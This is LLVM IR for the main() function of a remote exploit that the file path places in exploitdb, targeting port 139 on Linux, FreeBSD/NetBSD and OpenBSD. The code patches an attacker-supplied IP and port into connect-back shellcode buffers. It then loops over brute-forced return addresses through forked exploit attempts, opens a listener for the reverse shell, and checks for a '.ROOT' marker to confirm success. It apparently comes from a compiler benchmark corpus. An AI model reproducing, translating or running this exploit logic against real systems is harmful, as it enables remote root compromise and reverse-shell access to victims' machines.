; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22470.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22470.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i8*, i32 }
%struct.hostent = type { i32, i32 }
%struct.stat = type { i32 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"Os type out of list!\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"Unable to resolve\0A\00", align 1
@listen_pid = common dso_local global i64 0, align 8
@exploit_pid = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@linux_connect_back = common dso_local global i8* null, align 8
@bsd_connect_back = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [42 x i8] c"[+] Connecting back to: [%d.%d.%d.%d:%d]\0A\00", align 1
@port_listen = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"FreeBSD/NetBSD\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"OpenBSD 3.1 and prior\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"OpenBSD 3.2 non-exec stack\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"[+] Target: %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [26 x i8] c"[+] Connected to [%s:%d]\0A\00", align 1
@.str.10 = private unnamed_addr constant [32 x i8] c"[+] Please wait in seconds...!\0A\00", align 1
@SIGUSR2 = common dso_local global i64 0, align 8
@GoAway = common dso_local global i32 0, align 4
@childs = common dso_local global i32* null, align 8
@LOOP = common dso_local global i64 0, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [21 x i8] c"[+] socket() error.\0A\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c".ROOT\00", align 1
@.str.13 = private unnamed_addr constant [27 x i8] c"[+] Dohh, exploit failed.\0A\00", align 1
@client = common dso_local global i32 0, align 4
@sock_listen = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca i64, align 8
  %23 = alloca i16, align 2
  %24 = alloca %struct.sockaddr_in, align 8
  %25 = alloca %struct.hostent*, align 8
  %26 = alloca %struct.stat, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i32 -1, i32* %7, align 4
  store i32 139, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 512, i32* %18, align 4
  store i32 64, i32* %19, align 4
  store i64 40, i64* %21, align 8
  store i64 0, i64* %22, align 8
  %27 = load i32, i32* %4, align 4
  %28 = icmp ne i32 %27, 4
  br i1 %28, label %29, label %34

29:                                               ; preds = %2
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @usage(i8* %32)
  br label %34

34:                                               ; preds = %29, %2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %7, align 4
  %39 = load i32, i32* %7, align 4
  %40 = icmp sgt i32 %39, 3
  br i1 %40, label %41, label %45

41:                                               ; preds = %34
  %42 = load i32, i32* @stdout, align 4
  %43 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  %44 = call i32 @exit(i32 1) #3
  unreachable

45:                                               ; preds = %34
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 2
  %48 = load i8*, i8** %47, align 8
  %49 = call %struct.hostent* @gethostbyname(i8* %48)
  store %struct.hostent* %49, %struct.hostent** %25, align 8
  %50 = load %struct.hostent*, %struct.hostent** %25, align 8
  %51 = icmp eq %struct.hostent* %50, null
  br i1 %51, label %52, label %55

52:                                               ; preds = %45
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %299

55:                                               ; preds = %45
  %56 = call i64 (...) @getpid()
  store i64 %56, i64* @listen_pid, align 8
  %57 = call i32 (...) @start_listen()
  %58 = load i64, i64* @listen_pid, align 8
  %59 = add nsw i64 %58, 1
  store i64 %59, i64* @exploit_pid, align 8
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 3
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @sscanf(i8* %62, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32* %13, i32* %14, i32* %15, i32* %16)
  %64 = load i32, i32* %13, align 4
  %65 = trunc i32 %64 to i8
  %66 = load i8*, i8** @linux_connect_back, align 8
  %67 = getelementptr inbounds i8, i8* %66, i64 171
  store i8 %65, i8* %67, align 1
  %68 = load i32, i32* %13, align 4
  %69 = trunc i32 %68 to i8
  %70 = load i8*, i8** @bsd_connect_back, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 162
  store i8 %69, i8* %71, align 1
  %72 = load i32, i32* %14, align 4
  %73 = trunc i32 %72 to i8
  %74 = load i8*, i8** @linux_connect_back, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 172
  store i8 %73, i8* %75, align 1
  %76 = load i32, i32* %14, align 4
  %77 = trunc i32 %76 to i8
  %78 = load i8*, i8** @bsd_connect_back, align 8
  %79 = getelementptr inbounds i8, i8* %78, i64 163
  store i8 %77, i8* %79, align 1
  %80 = load i32, i32* %15, align 4
  %81 = trunc i32 %80 to i8
  %82 = load i8*, i8** @linux_connect_back, align 8
  %83 = getelementptr inbounds i8, i8* %82, i64 173
  store i8 %81, i8* %83, align 1
  %84 = load i32, i32* %15, align 4
  %85 = trunc i32 %84 to i8
  %86 = load i8*, i8** @bsd_connect_back, align 8
  %87 = getelementptr inbounds i8, i8* %86, i64 164
  store i8 %85, i8* %87, align 1
  %88 = load i32, i32* %16, align 4
  %89 = trunc i32 %88 to i8
  %90 = load i8*, i8** @linux_connect_back, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 174
  store i8 %89, i8* %91, align 1
  %92 = load i32, i32* %16, align 4
  %93 = trunc i32 %92 to i8
  %94 = load i8*, i8** @bsd_connect_back, align 8
  %95 = getelementptr inbounds i8, i8* %94, i64 165
  store i8 %93, i8* %95, align 1
  %96 = load i32, i32* @stdout, align 4
  %97 = load i32, i32* %13, align 4
  %98 = load i32, i32* %14, align 4
  %99 = load i32, i32* %15, align 4
  %100 = load i32, i32* %16, align 4
  %101 = load i32, i32* @port_listen, align 4
  %102 = call i32 (i32, i8*, ...) @fprintf(i32 %96, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0), i32 %97, i32 %98, i32 %99, i32 %100, i32 %101)
  %103 = load i32, i32* @port_listen, align 4
  %104 = call i8* @htons(i32 %103)
  %105 = ptrtoint i8* %104 to i16
  store i16 %105, i16* %23, align 2
  %106 = load i16, i16* %23, align 2
  %107 = zext i16 %106 to i32
  %108 = and i32 %107, 255
  %109 = trunc i32 %108 to i8
  %110 = load i8*, i8** @linux_connect_back, align 8
  %111 = getelementptr inbounds i8, i8* %110, i64 177
  store i8 %109, i8* %111, align 1
  %112 = load i16, i16* %23, align 2
  %113 = zext i16 %112 to i32
  %114 = ashr i32 %113, 8
  %115 = and i32 %114, 255
  %116 = trunc i32 %115 to i8
  %117 = load i8*, i8** @linux_connect_back, align 8
  %118 = getelementptr inbounds i8, i8* %117, i64 178
  store i8 %116, i8* %118, align 1
  %119 = load i16, i16* %23, align 2
  %120 = zext i16 %119 to i32
  %121 = and i32 %120, 255
  %122 = trunc i32 %121 to i8
  %123 = load i8*, i8** @bsd_connect_back, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 168
  store i8 %122, i8* %124, align 1
  %125 = load i16, i16* %23, align 2
  %126 = zext i16 %125 to i32
  %127 = ashr i32 %126, 8
  %128 = and i32 %127, 255
  %129 = trunc i32 %128 to i8
  %130 = load i8*, i8** @bsd_connect_back, align 8
  %131 = getelementptr inbounds i8, i8* %130, i64 169
  store i8 %129, i8* %131, align 1
  %132 = load i32, i32* %7, align 4
  switch i32 %132, label %141 [
    i32 0, label %133
    i32 1, label %135
    i32 2, label %137
    i32 3, label %139
  ]

133:                                              ; preds = %55
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i8** %20, align 8
  store i64 3221225472, i64* %22, align 8
  %134 = load i8*, i8** @linux_connect_back, align 8
  store i8* %134, i8** %6, align 8
  br label %141

135:                                              ; preds = %55
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0), i8** %20, align 8
  store i64 3217031168, i64* %22, align 8
  %136 = load i8*, i8** @bsd_connect_back, align 8
  store i8* %136, i8** %6, align 8
  br label %141

137:                                              ; preds = %55
  store i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8** %20, align 8
  store i64 3753902080, i64* %22, align 8
  %138 = load i8*, i8** @bsd_connect_back, align 8
  store i8* %138, i8** %6, align 8
  br label %141

139:                                              ; preds = %55
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0), i8** %20, align 8
  store i64 1507328, i64* %22, align 8
  %140 = load i8*, i8** @bsd_connect_back, align 8
  store i8* %140, i8** %6, align 8
  br label %141

141:                                              ; preds = %55, %139, %137, %135, %133
  %142 = load i32, i32* @stdout, align 4
  %143 = load i8*, i8** %20, align 8
  %144 = call i32 (i32, i8*, ...) @fprintf(i32 %142, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0), i8* %143)
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  %146 = load %struct.hostent*, %struct.hostent** %25, align 8
  %147 = getelementptr inbounds %struct.hostent, %struct.hostent* %146, i32 0, i32 1
  %148 = load i32, i32* %147, align 4
  %149 = load %struct.hostent*, %struct.hostent** %25, align 8
  %150 = getelementptr inbounds %struct.hostent, %struct.hostent* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @memcpy(i32* %145, i32 %148, i32 %151)
  %153 = load i32, i32* @AF_INET, align 4
  %154 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  store i32 %153, i32* %154, align 8
  %155 = load i32, i32* %8, align 4
  %156 = call i8* @htons(i32 %155)
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i8* %156, i8** %157, align 8
  %158 = load i32, i32* @stdout, align 4
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = call i64 @inet_ntoa(i32 %160)
  %162 = inttoptr i64 %161 to i8*
  %163 = load i32, i32* %8, align 4
  %164 = call i32 (i32, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.9, i64 0, i64 0), i8* %162, i32 %163)
  %165 = load i32, i32* @stdout, align 4
  %166 = call i32 (i32, i8*, ...) @fprintf(i32 %165, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.10, i64 0, i64 0))
  %167 = load i64, i64* @SIGUSR2, align 8
  %168 = load i32, i32* @GoAway, align 4
  %169 = call i32 @signal(i64 %167, i32 %168)
  store i32 0, i32* %10, align 4
  br label %170

170:                                              ; preds = %178, %141
  %171 = load i32, i32* %10, align 4
  %172 = icmp slt i32 %171, 50
  br i1 %172, label %173, label %181

173:                                              ; preds = %170
  %174 = load i32*, i32** @childs, align 8
  %175 = load i32, i32* %10, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i32, i32* %174, i64 %176
  store i32 -1, i32* %177, align 4
  br label %178

178:                                              ; preds = %173
  %179 = load i32, i32* %10, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %10, align 4
  br label %170

181:                                              ; preds = %170
  store i32 0, i32* %10, align 4
  store i32 0, i32* %12, align 4
  br label %182

182:                                              ; preds = %279, %181
  %183 = load i64, i64* @LOOP, align 8
  %184 = icmp ne i64 %183, 0
  br i1 %184, label %185, label %280

185:                                              ; preds = %182
  %186 = load i32, i32* @AF_INET, align 4
  %187 = load i32, i32* @SOCK_STREAM, align 4
  %188 = call i32 @socket(i32 %186, i32 %187, i32 6)
  store i32 %188, i32* %9, align 4
  %189 = icmp slt i32 %188, 0
  br i1 %189, label %190, label %194

190:                                              ; preds = %185
  %191 = load i32, i32* @stderr, align 4
  %192 = call i32 (i32, i8*, ...) @fprintf(i32 %191, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.11, i64 0, i64 0))
  %193 = call i32 @exit(i32 -1) #3
  unreachable

194:                                              ; preds = %185
  %195 = load i32, i32* %18, align 4
  %196 = sext i32 %195 to i64
  %197 = load i64, i64* %22, align 8
  %198 = sub i64 %197, %196
  store i64 %198, i64* %22, align 8
  %199 = load i32, i32* %10, align 4
  %200 = add nsw i32 %199, 1
  store i32 %200, i32* %10, align 4
  %201 = load i64, i64* %22, align 8
  %202 = and i64 %201, 255
  %203 = icmp eq i64 %202, 0
  br i1 %203, label %204, label %210

204:                                              ; preds = %194
  %205 = load i32, i32* %7, align 4
  %206 = icmp ne i32 %205, 3
  br i1 %206, label %207, label %210

207:                                              ; preds = %204
  %208 = load i64, i64* %22, align 8
  %209 = add i64 %208, 1
  store i64 %209, i64* %22, align 8
  br label %210

210:                                              ; preds = %207, %204, %194
  %211 = load i32, i32* %12, align 4
  %212 = add nsw i32 %211, 1
  store i32 %212, i32* %12, align 4
  %213 = call i32 @usleep(i32 150000)
  %214 = call i32 (...) @fork()
  %215 = load i32*, i32** @childs, align 8
  %216 = load i32, i32* %10, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i32, i32* %215, i64 %217
  store i32 %214, i32* %218, align 4
  switch i32 %214, label %263 [
    i32 0, label %219
    i32 -1, label %261
  ]

219:                                              ; preds = %210
  %220 = load i32, i32* %9, align 4
  %221 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %222 = call i32 @connect(i32 %220, %struct.sockaddr* %221, i32 24)
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %224, label %228

224:                                              ; preds = %219
  %225 = load i32, i32* %9, align 4
  %226 = call i32 @close(i32 %225)
  %227 = call i32 @exit(i32 -1) #3
  unreachable

228:                                              ; preds = %219
  %229 = load i32, i32* %9, align 4
  %230 = call i32 @start_session(i32 %229)
  %231 = call i32 @sleep(i32 3)
  %232 = load i32, i32* %7, align 4
  %233 = icmp ne i32 %232, 3
  br i1 %233, label %234, label %245

234:                                              ; preds = %228
  %235 = load i32, i32* %9, align 4
  %236 = load i64, i64* %22, align 8
  %237 = load i8*, i8** %6, align 8
  %238 = call i32 @exploit_normal(i32 %235, i64 %236, i8* %237)
  %239 = icmp slt i32 %238, 0
  br i1 %239, label %240, label %244

240:                                              ; preds = %234
  %241 = load i32, i32* %9, align 4
  %242 = call i32 @close(i32 %241)
  %243 = call i32 @exit(i32 -1) #3
  unreachable

244:                                              ; preds = %234
  br label %256

245:                                              ; preds = %228
  %246 = load i32, i32* %9, align 4
  %247 = load i64, i64* %22, align 8
  %248 = load i8*, i8** %6, align 8
  %249 = call i32 @exploit_openbsd32(i32 %246, i64 %247, i8* %248)
  %250 = icmp slt i32 %249, 0
  br i1 %250, label %251, label %255

251:                                              ; preds = %245
  %252 = load i32, i32* %9, align 4
  %253 = call i32 @close(i32 %252)
  %254 = call i32 @exit(i32 -1) #3
  unreachable

255:                                              ; preds = %245
  br label %256

256:                                              ; preds = %255, %244
  %257 = call i32 @sleep(i32 5)
  %258 = load i32, i32* %9, align 4
  %259 = call i32 @close(i32 %258)
  %260 = call i32 @exit(i32 0) #3
  unreachable

261:                                              ; preds = %210
  %262 = call i32 @exit(i32 -1) #3
  unreachable

263:                                              ; preds = %210
  %264 = load i32, i32* %10, align 4
  %265 = sext i32 %264 to i64
  %266 = load i64, i64* %21, align 8
  %267 = sub i64 %266, 2
  %268 = icmp ugt i64 %265, %267
  br i1 %268, label %269, label %273

269:                                              ; preds = %263
  %270 = call i32 @wait(i32* %11)
  %271 = load i32, i32* %10, align 4
  %272 = add nsw i32 %271, -1
  store i32 %272, i32* %10, align 4
  br label %273

273:                                              ; preds = %269, %263
  br label %274

274:                                              ; preds = %273
  %275 = load i32, i32* %12, align 4
  %276 = load i32, i32* %19, align 4
  %277 = icmp eq i32 %275, %276
  br i1 %277, label %278, label %279

278:                                              ; preds = %274
  store i64 0, i64* @LOOP, align 8
  br label %279

279:                                              ; preds = %278, %274
  br label %182

280:                                              ; preds = %182
  %281 = call i32 @stat(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), %struct.stat* %26)
  %282 = icmp ne i32 %281, -1
  br i1 %282, label %283, label %287

283:                                              ; preds = %280
  %284 = load i64, i64* @SIGUSR2, align 8
  %285 = load i64, i64* @listen_pid, align 8
  %286 = call i32 @kill(i64 %284, i64 %285)
  br label %299

287:                                              ; preds = %280
  %288 = load i32, i32* @stdout, align 4
  %289 = call i32 (i32, i8*, ...) @fprintf(i32 %288, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  %290 = load i32, i32* @client, align 4
  %291 = call i32 @close(i32 %290)
  %292 = load i32, i32* @sock_listen, align 4
  %293 = call i32 @close(i32 %292)
  %294 = load i64, i64* @listen_pid, align 8
  %295 = load i64, i64* @SIGUSR2, align 8
  %296 = call i32 @kill(i64 %294, i64 %295)
  %297 = call i32 @sleep(i32 2)
  %298 = call i32 @exit(i32 0) #3
  unreachable

299:                                              ; preds = %52, %283
  %300 = load i32, i32* %3, align 4
  ret i32 %300
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i64 @getpid(...) #1

declare dso_local i32 @start_listen(...) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*, i32*, i32*, i32*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i64 @inet_ntoa(i32) #1

declare dso_local i32 @signal(i64, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @start_session(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @exploit_normal(i32, i64, i8*) #1

declare dso_local i32 @exploit_openbsd32(i32, i64, i8*) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @kill(i64, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
